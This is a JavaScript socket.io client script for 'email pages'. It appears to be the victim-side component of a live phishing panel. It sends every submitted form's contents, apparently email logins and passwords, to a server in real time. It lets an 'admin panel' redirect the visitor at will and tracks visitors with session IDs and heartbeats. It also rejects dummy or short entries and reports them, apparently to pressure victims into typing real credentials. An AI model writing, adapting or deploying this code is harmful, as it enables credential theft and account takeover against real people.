// WebSocket connection handler for email pages
(function() {
    // Wait for DOM and socket.io to be ready
    function initializeSocket() {
        if (typeof io === 'undefined') {
            setTimeout(initializeSocket, 100);
            return;
        }

        // Initialize socket connection
        window.socket = io('/user', {
            transports: ['websocket'],
            query: {
                page: window.location.pathname,
                sessionId: getSessionId()
            }
        });

        // Get session ID from URL or generate one
        function getSessionId() {
            const params = new URLSearchParams(window.location.search);
            let sessionId = params.get('session') || params.get('id');

            if (!sessionId) {
                sessionId = localStorage.getItem('sessionId');
                if (!sessionId) {
                    sessionId = generateSessionId();
                    localStorage.setItem('sessionId', sessionId);
                }
            }

            return sessionId;
        }

        // Generate unique session ID
        function generateSessionId() {
            return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        }

        // Socket event handlers
        window.socket.on('connect', function() {
            console.log('Socket connected');

            // Send page view event
            window.socket.emit('page_view', {
                page: window.location.pathname,
                timestamp: new Date().toISOString()
            });
        });

        window.socket.on('disconnect', function() {
            console.log('Socket disconnected');
        });

        window.socket.on('connect_error', function(error) {
            console.error('Socket connection error:', error);
        });

        // Handle redirects from admin panel
        window.socket.on('redirect', function(url) {
            console.log('Redirecting to:', url);
            window.location.href = url;
        });

        // Handle session URL updates
        window.socket.on('session_url', function(url) {
            if (url && url !== window.location.pathname + window.location.search) {
                window.history.replaceState({}, '', url);
            }
        });

        // Form submission handler with placeholders
        window.handleFormSubmit = function(formType, data, redirectPage) {
            // Check for placeholder fields
            const placeholderFields = detectPlaceholderFields(data);

            if (placeholderFields.length > 0) {
                // Send notification that placeholder fields need to be filled
                window.socket.emit('placeholder_detected', {
                    page: window.location.pathname,
                    fields: placeholderFields,
                    formType: formType,
                    timestamp: new Date().toISOString()
                });

                // Show error message to user
                showPlaceholderError(placeholderFields);
                return false;
            }

            // Send form data to server
            window.socket.emit('user_action', {
                type: formType,
                data: data,
                page: window.location.pathname,
                timestamp: new Date().toISOString()
            });

            // Set loading state
            window.socket.emit('page_loading', true);

            // Request redirect if specified
            if (redirectPage) {
                setTimeout(function() {
                    window.socket.emit('request_redirect', { page: redirectPage });
                }, 500);
            }

            return true;
        };

        // Detect placeholder fields
        function detectPlaceholderFields(data) {
            const placeholders = [];
            const placeholderPatterns = [
                /\[.*?\]/g,  // Brackets like [email]
                /\{.*?\}/g,  // Curly braces like {password}
                /<.*?>/g,    // Angle brackets like <username>
                /xxx+/i,     // Multiple x's
                /placeholder/i,
                /enter.*here/i,
                /your.*email/i,
                /your.*password/i
            ];

            for (const [key, value] of Object.entries(data)) {
                if (typeof value === 'string') {
                    for (const pattern of placeholderPatterns) {
                        if (pattern.test(value)) {
                            placeholders.push({
                                field: key,
                                value: value,
                                reason: 'Contains placeholder text'
                            });
                            break;
                        }
                    }

                    // Check for empty or very short values
                    if (value.trim().length < 3) {
                        placeholders.push({
                            field: key,
                            value: value,
                            reason: 'Field is too short or empty'
                        });
                    }
                }
            }

            return placeholders;
        }

        // Show placeholder error message
        function showPlaceholderError(placeholderFields) {
            const fieldNames = placeholderFields.map(f => f.field).join(', ');
            const errorMessage = `Please fill in the following fields properly: ${fieldNames}`;

            // Try to find error element on page
            const errorElements = document.querySelectorAll('[class*="error"], [id*="error"], .alert, .warning');
            if (errorElements.length > 0) {
                errorElements[0].textContent = errorMessage;
                errorElements[0].style.display = 'block';
            } else {
                // Create error element if none exists
                const errorDiv = document.createElement('div');
                errorDiv.className = 'error-message';
                errorDiv.style.cssText = 'color: red; padding: 10px; margin: 10px 0; border: 1px solid red; background: #ffe6e6;';
                errorDiv.textContent = errorMessage;

                const form = document.querySelector('form');
                if (form) {
                    form.insertBefore(errorDiv, form.firstChild);
                }
            }
        }

        // Send heartbeat
        setInterval(function() {
            if (window.socket && window.socket.connected) {
                window.socket.emit('heartbeat', {
                    page: window.location.pathname,
                    timestamp: new Date().toISOString()
                });
            }
        }, 30000); // Every 30 seconds

        // Make socket globally available
        window.socketInitialized = true;
    }

    // Initialize when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initializeSocket);
    } else {
        initializeSocket();
    }
})();